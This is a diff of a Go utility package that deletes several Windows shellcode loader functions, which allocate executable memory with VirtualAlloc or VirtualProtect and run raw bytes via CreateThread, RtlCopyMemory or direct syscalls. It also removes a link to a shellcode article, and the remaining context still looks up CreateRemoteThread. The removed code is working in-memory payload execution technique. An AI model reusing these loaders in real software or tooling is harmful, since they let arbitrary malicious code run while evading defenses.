@@ -1,6 +1,3 @@
-//https://www.thepolyglotdeveloper.com/2018/02/encrypt-decrypt-data-golang-application-crypto-packages/
-//https://medium.com/syscall59/a-trinity-of-shellcode-aes-go-f6cec854f992
-
 package useful
 
 import (
@@ -149,47 +146,6 @@ var (
 	CreateRemoteThread  = kernel32.MustFindProc("CreateRemoteThread")
 )
 
-//=========================================================
-//		CreateThread
-//=========================================================
-
-// ShellCodeThreadExecute executes shellcode in the current process using VirtualAlloc and CreateThread
-func ShellCodeThreadExecute(Shellcode []byte) {
-	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
-	for i := 0; i < len(Shellcode); i++ {
-		AddrPtr[i] = Shellcode[i]
-	}
-	ThreadAddr, _, _ := CreateThread.Call(0, 0, Addr, 0, 0, 0)
-	WaitForSingleObject.Call(ThreadAddr, 0xFFFFFFFF)
-}
-
-//=========================================================
-//		RTLCopyMemory
-//=========================================================
-
-// ShellCodeRTLCopyMemory executes shellcode in the current process using VirtualAlloc and RtlCopyMemory
-func ShellCodeRTLCopyMemory(shellcode []byte) error {
-	// allocate memory within the current process
-	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-	if addr == 0 {
-		return err
-	}
-	// copy shellcode into memory
-	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-	if err != nil {
-		if err.Error() != "The operation completed successfully." {
-			return err
-		}
-	}
-	// execute shellcode
-	_, _, err = syscall.Syscall(addr, 0, 0, 0, 0)
-	if err != nil {
-		if err.Error() != "The operation completed successfully." {
-			return err
-		}
-	}
-	return nil
 }
 
 //=========================================================
@@ -204,41 +160,6 @@ func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint3
 		uintptr(flNewProtect),
 		uintptr(lpflOldProtect))
 	return ret > 0
-}
-
-// ShellCodeVirtualProtect executes shellcode in the current process by using the VirtualProtect function and a function pointer
-func ShellCodeVirtualProtect(sc []byte) {
-	// TODO need a Go safe fork
-	// Make a function ptr
-	f := func() {}
-	// Change permissions on f function ptr
-	var oldfperms uint32
-	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
-		panic("Call to VirtualProtect failed!")
-	}
-	// Override function ptr
-	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))
-	// Change permissions on shellcode string data
-	var oldshellcodeperms uint32
-	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
-		panic("Call to VirtualProtect failed!")
-	}
-	// Call the function ptr it
-	f()
-}
-
-//=========================================================
-//		Syscall
-//=========================================================
-
-// ShellCodeSyscall executes shellcode using syscall.Syscall()
-func ShellCodeSyscall(Shellcode []byte) {
-	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
-	for i := 0; i < len(Shellcode); i++ {
-		AddrPtr[i] = Shellcode[i]
-	}
-	syscall.Syscall(Addr, 0, 0, 0, 0)
 }
 
 //=========================================================
